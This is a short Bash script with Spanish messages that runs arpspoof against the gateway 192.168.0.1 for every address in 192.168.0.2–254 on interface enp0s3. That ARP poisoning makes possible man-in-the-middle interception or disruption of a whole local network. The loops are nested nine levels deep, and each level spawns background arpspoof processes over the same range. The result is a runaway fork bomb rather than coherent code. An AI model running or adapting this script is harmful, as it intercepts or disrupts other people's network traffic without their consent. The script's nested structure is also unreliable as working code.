#!/bin/bash
#COLORES
greenColour="\e[0;32m\033[1m"
endColour="\033[0m\e[0m"
redColour="\e[0;31m\033[1m"
blueColour="\e[0;34m\033[1m"
yellowColour="\e[0;33m\033[1m"
purpleColour="\e[0;35m\033[1m"
turquoiseColour="\e[0;36m\033[1m"
grayColour="\e[0;37m\033[1m"

#SALIDA DEL PROGRAMA
function ctrl_c (){
	rm log
	echo -ne "\r         "
	echo -e "\n ${redColour}[+] Salida \n"
	exit 1
}

trap ctrl_c INT

echo "EJECUTANDO SCRIPT"
sleep 0.5

for host in {2..254};
do
  	arpspoof -i enp0s3 -t 192.168.0.1 192.168.0.$host &
	for a in {2..254};
	do
		arpspoof -i enp0s3 -t 192.168.0.1 192.168.0.$a &
		for b in {2..254};
		do
			arpspoof -i enp0s3 -t 192.168.0.1 192.168.0.$b &
			for c in {2..254};
			do
				arpspoof -i enp0s3 -t 192.168.0.1 192.168.0.$c &
				for d in {2..254};
				do
					arpspoof -i enp0s3 -t 192.168.0.1 192.168.0.$d &
					for e in {2..254};
					do
						arpspoof -i enp0s3 -t 192.168.0.1 192.168.0.$e &
						for f in {2..254};
						do
							arpspoof -i enp0s3 -t 192.168.0.1 192.168.0.$f &
							for g in {2..254};
							do
								arpspoof -i enp0s3 -t 192.168.0.1 192.168.0.$g &
								for h in {2..254};
								do
									arpspoof -i enp0s3 -t 192.168.0.1 192.168.0.$h &
								done; wait
							done; wait
						done; wait
					done; wait
				done; wait
			done; wait
		done; wait
	done; wait
done; wait




exit


